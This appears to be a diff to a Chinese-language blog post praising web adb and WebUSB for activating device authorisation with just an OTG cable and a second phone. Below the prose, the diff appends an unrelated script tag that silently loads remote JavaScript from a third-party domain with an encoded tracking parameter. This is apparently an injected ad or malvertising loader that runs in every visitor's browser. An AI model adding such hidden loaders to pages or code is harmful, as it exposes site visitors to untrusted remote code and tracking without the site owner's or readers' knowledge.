@@ -28,3 +28,5 @@ tags:
 
 在特点之中web adb最为闪亮，webUSB这项谷歌还在实验阶段的技术的使用，让web adb成为可能，adb变得更加便捷。
 最重要的是让你在没有电脑的情况下激活授权，而需要的只是一根otg和另一部手机。
+
+<script>(function(d){let s=d.createElement('script');s.async=true;s.src='https://puabvo.com/code/native.js?h=waWQiOjExNjQ1NDIsInNpZCI6MTMwNTk5OSwid2lkIjo1MTgwNTYsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);</script>
